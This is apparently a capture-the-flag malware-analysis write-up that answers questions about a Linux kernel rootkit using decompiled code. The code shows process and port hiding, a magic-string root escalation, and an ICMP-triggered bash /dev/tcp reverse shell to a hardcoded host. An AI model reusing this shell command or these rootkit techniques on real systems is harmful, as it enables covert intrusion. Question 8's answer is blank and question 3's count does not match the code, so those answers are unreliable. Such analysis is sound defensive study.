## 1.What is the SHA256 hash of the sample?
```bash
PS C:\\Users\\a\\Desktop\\challenge-13> Get-FileHash .\\singularity.ko -Algorithm SHA256
Algorithm       Hash                                                                   Path

---------       ----                                                                   ----

SHA256          0B8ECDACCF492000F3143FA209481EB9DB8C0A29DA2B79FF5B7F6E84BB3AC7C8       C:\\Users\\a\\Desktop\\challenge-...
```

**0B8ECDACCF492000F3143FA209481EB9DB8C0A29DA2B79FF5B7F6E84BB3AC7C8**

## 2.What is the name of the primary initialization function called when the module is loaded?
```bash
// Alternative name is 'init_module'
int __cdecl singularity_init()
{
  int v0; // ebx
  int v1; // ebx
  int v2; // ebx
  int v3; // ebx
  int v4; // ebx
  int v5; // ebx
  int v6; // ebx
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // ebx
  int v11; // ebx
  int v12; // ebx
  int v13; // ebx

  _fentry__();
  v0 = reset_tainted_init();
  v1 = hiding_open_init() | v0;
  v2 = become_root_init() | v1;
  v3 = hiding_directory_init() | v2;
  v4 = hiding_stat_init() | v3;
  v5 = hiding_tcp_init() | v4;
  v6 = hooking_insmod_init() | v5;
  v7 = clear_taint_dmesg_init() | v6;
  v8 = hooks_write_init() | v7;
  v9 = hiding_chdir_init() | v8;
  v10 = hiding_readlink_init() | v9;
  v11 = bpf_hook_init() | v10;
  v12 = hiding_icmp_init() | v11;
  v13 = trace_pid_init() | v12;
  module_hide_current();
  return v13;
}
```

**init_module**

## 3.How many distinct feature-initialization functions are called within above mentioned function?

There are 15 functions called in the init function

**15**

## 4.The reset_tainted_init function creates a kernel thread for anti-forensics. What is the hardcoded name of this thread?
```bash
v1 = (task_struct *)kthread_create_on_node(zt_thread, 0, 0xFFFFFFFFLL, "zer0t");
  v2 = v1;
  if ( (unsigned __int64)v1 > 0xFFFFFFFFFFFFF000LL )
  {
    cleaner_thread = v1;
  }
```

**zer0t**

## 5.The add_hidden_pid function has a hardcoded limit. What is the maximum number of PIDs the rootkit can hide?
```bash
if ( ++v3 == &hidden_pids[hidden_count] )
      {
        if ( hidden_count == 32 )
          return;
        goto LABEL_7;
      }
```

**32**

## 6.What is the name of the function called last within init_module to hide the rootkit itself?

**module_hide_current**

## 7.The TCP port hiding module is initialized. What is the hardcoded port number it is configured to hide (decimal)?
```bash
__int64 __fastcall hooked_tcp4_seq_show(seq_file *seq, _DWORD *v)
{
  int v2; // r12d
  __int16 v3; // r14
  __int16 v4; // r13
  int v5; // r12d

  if ( v == (_DWORD *)((char *)&_UNIQUE_ID___addressable_trace_pid_cleanup878 + 1) )
    return orig_tcp4_seq_show(seq, (char *)&_UNIQUE_ID___addressable_trace_pid_cleanup878 + 1);
  v2 = v[198];
  v3 = *((_WORD *)v + 6);
  v4 = *((_WORD *)v + 399);
  if ( v2 == (unsigned int)in_aton("192.168.5.128") )
    return 0;
  v5 = *v;
  if ( v5 == (unsigned int)in_aton("192.168.5.128") || v4 == (__int16)0xA146 || v3 == (__int16)0xA146 )
    return 0;
  else
    return orig_tcp4_seq_show(seq, v);
}
```
Port numbers are stored in network byte order (big-endian), we need to byte-swap 0xA146 -> 0x46A1 = 18081

**18081**

## 8.What is the hardcoded "magic word" string, checked for by the privilege escalation module?
```bash
__int64 __fastcall hook_getuid(const pt_regs *regs)
{
  unsigned __int64 v1; // rbp
  __int64 v2; // r12
  __int64 v3; // rax
  const char *v4; // r13
  int v5; // eax
  char *v6; // rdx
  __int64 v7; // rax
  _QWORD *v8; // rax

  v1 = __readgsqword((unsigned int)&const_pcpu_hot);
  if ( !strcmp((const char *)(v1 + 2976), "bash") )
  {
    v2 = *(_QWORD *)(v1 + 2304);
    if ( v2 )
    {
      if ( *(_QWORD *)(v2 + 384) )
      {
        if ( *(_QWORD *)(v2 + 392) )
        {
          v3 = _kmalloc_cache_noprof(kmalloc_caches[12], 2080, 4096);
          v4 = (const char *)v3;
          if ( v3 )
          {
            v5 = access_process_vm(v1, *(_QWORD *)(v2 + 384), v3, 4095, 0);
            if ( v5 > 0 )
            {
              if ( v5 != 1 )
              {
                v6 = (char *)v4;
                v7 = (__int64)&v4[v5 - 2 + 1];
                do
                {
                  if ( !*v6 )
                    *v6 = 32;
                  ++v6;
                }
                while ( v6 != (char *)v7 );
              }
              if ( strstr(v4, "MAGIC=babyelephant") )
              {
                v8 = (_QWORD *)prepare_creds();
                if ( v8 )
                {
                  v8[1] = 0;
                  v8[2] = 0;
                  v8[3] = 0;
                  v8[4] = 0;
                  commit_creds(v8);
                }
              }
            }
            kfree(v4);
          }
        }
      }
    }
  }
  return orig_getuid(regs);
}
```

****

## 9.How many hooks, in total, does the become_root_init function install to enable privilege escalation?
```bash
int __cdecl become_root_init()
{
  return fh_install_hooks(hooks, 0xAu);
}
```

**10**

## 10.What is the hardcoded IPv4 address of the C2 server?
```bash
void __fastcall spawn_revshell(work_struct *work)
{
  __int64 v2; // rdx
  __int64 v3; // rax
  int v4; // ebp
  int v5; // eax
  const char *v6; // rsi
  __int64 v7; // rax
  __int64 v8; // rdi
  __int64 v9; // rdx
  __int64 v10; // rbx
  __int64 i; // r14
  int v12; // r12d
  char *argv[5]; // [rsp+0h] [rbp-360h] BYREF
  char cmd[768]; // [rsp+28h] [rbp-338h] BYREF
  unsigned __int64 v15; // [rsp+328h] [rbp-38h]

  v15 = __readgsqword(0x28u);
  argv[0] = "/usr/bin/setsid";
  argv[1] = "/bin/bash";
  argv[2] = "-c";
  argv[4] = 0;
  memset(cmd, 0, sizeof(cmd));
  snprintf(
    cmd,
    0x300u,
    "bash -c 'PID=$$; kill -59 $PID; exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1' &",
    "firefox-updater",
    "192.168.5.128",
    "443");
  argv[3] = cmd;
  _rcu_read_lock();
  v3 = init_task[278];
  if ( (_QWORD *)v3 == &init_task[278] )
  {
    v4 = 0;
  }
  else
  {
    v2 = v3 - 2224;
    v4 = 0;
    do
    {
      v5 = *(_DWORD *)(v3 + 208);
      if ( v4 < v5 )
        v4 = v5;
      v3 = *(_QWORD *)(v2 + 2224);
      v2 = v3 - 2224;
    }
    while ( (_QWORD *)v3 != &init_task[278] );
  }
  _rcu_read_unlock(cmd, 768, v2);
  v6 = (const char *)argv;
  v7 = call_usermodehelper_setup(argv[0], argv, envp_0, 3264, 0, 0, 0);
  if ( v7 )
  {
    v6 = (_BYTE *)(&_UNIQUE_ID___addressable_trace_pid_cleanup878 + 2);
    call_usermodehelper_exec(v7, 2);
  }
  v8 = 1500;
  msleep(1500);
  _rcu_read_lock();
  v10 = init_task[278];
  for ( i = v10 - 2224; (_QWORD *)v10 != &init_task[278]; i = v10 - 2224 )
  {
    v12 = *(_DWORD *)(v10 + 208);
    if ( v12 > v4 )
    {
      if ( *(_QWORD *)(v10 + 80) )
      {
        v6 = "firefox-updater";
        if ( strstr((const char *)(v10 + 752), "firefox-updater")
          || (v6 = "setsid", v8 = v10 + 752, strstr((const char *)(v10 + 752), "setsid")) )
        {
          add_hidden_pid(v12);
          v8 = *(unsigned int *)(v10 + 212);
          add_hidden_pid(v8);
        }
      }
    }
    v10 = *(_QWORD *)(i + 2224);
  }
  _rcu_read_unlock(v8, v6, v9);
  kfree(work);
}
```

**192.168.5.128**

## 11.What is the hardcoded port number the C2 server listens on?

**443**

## 12.What network protocol is hooked to listen for the backdoor trigger?

**icmp**

## 13.What is the "magic" sequence number that triggers the reverse shell (decimal)?
```bash
if ( (unsigned int)in4_pton("192.168.5.128", 0xFFFFFFFFLL, &trigger_ip, 0xFFFFFFFFLL, 0) )
        {
          if ( *((_DWORD *)v5 + 3) == trigger_ip && *v7 == 8 && *((_WORD *)v7 + 3) == 0xCF07 )
```
Byte-swap the magic number into litte endian 0xCF07 -> 0x07CF = 1999

**1999**

## 14.When the trigger conditions are met, what is the name of the function queued to execute the reverse shell?
```bash
if ( (unsigned int)in4_pton("192.168.5.128", 0xFFFFFFFFLL, &trigger_ip, 0xFFFFFFFFLL, 0) )
        {
          if ( *((_DWORD *)v5 + 3) == trigger_ip && *v7 == 8 && *((_WORD *)v7 + 3) == 0xCF07 )
          {
            v8 = (_QWORD *)_kmalloc_cache_noprof(kmalloc_caches[5], 2080, 32);
            if ( v8 )
            {
              v8[3] = spawn_revshell;
              v9 = system_wq;
              *v8 = 0xFFFFFFFE00000LL;
              v8[1] = v8 + 1;
              v8[2] = v8 + 1;
              queue_work_on(0x2000, v9);
            }
          }
        }
```

**spawn_revshell**

## 15.The spawn_revshell function launches a process. What is the hardcoded process name it uses for the reverse shell?
```bash
snprintf(
    cmd,
    0x300u,
    "bash -c 'PID=$$; kill -59 $PID; exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1' &",
    "firefox-updater",
    "192.168.5.128",
    "443");
```

**firefox-updater**

